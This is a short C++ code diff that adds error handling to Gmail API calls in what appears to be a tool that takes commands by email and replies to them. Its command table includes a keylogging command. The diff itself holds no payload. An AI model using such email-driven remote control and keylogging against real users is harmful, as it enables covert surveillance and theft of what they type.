@@ -24,6 +24,13 @@ ProcessCommand::ProcessCommand() : message(), response() {
                      {"stopkeylog", new StopKeylogCommand},
                      {"help", new HelpCommand}
                      });
+    
+    try {
+        gmailapi.initOAuth();
+    }
+    catch (std::runtime_error& re) {
+        std::cerr << re.what() << std::endl;
+    }
 }
 
 ProcessCommand::~ProcessCommand() {
@@ -157,9 +164,14 @@ void ProcessCommand::executeCommand(Client& client) {
 }
 
 bool ProcessCommand::getLatestMessage() {
-    message = gmailapi.getLatestMessage(sender_query);
-    if (message.isEmpty()) return false;
-    gmailapi.markAsRead(message.getGmailID());
+    try {
+        message = gmailapi.getLatestMessage(sender_query);
+        if (message.isEmpty()) return false;
+        gmailapi.markAsRead(message.getGmailID());
+    }
+    catch (std::runtime_error& re) {
+        std::cerr << re.what() << std::endl;
+    }
     return true;
 }
 
@@ -169,7 +181,12 @@ void ProcessCommand::sendResponse(const std::string& response_string, const Atta
     response.setSubject("Re: " + message.getSubject());
     response.setBody(response_string);
 
+    try {
     gmailapi.replyMessage(message, response, attachment);
+    }
+    catch (std::runtime_error& re) {
+        std::cerr << re.what() << std::endl;
+    }
 }
 
 void ProcessCommand::processResponse() {
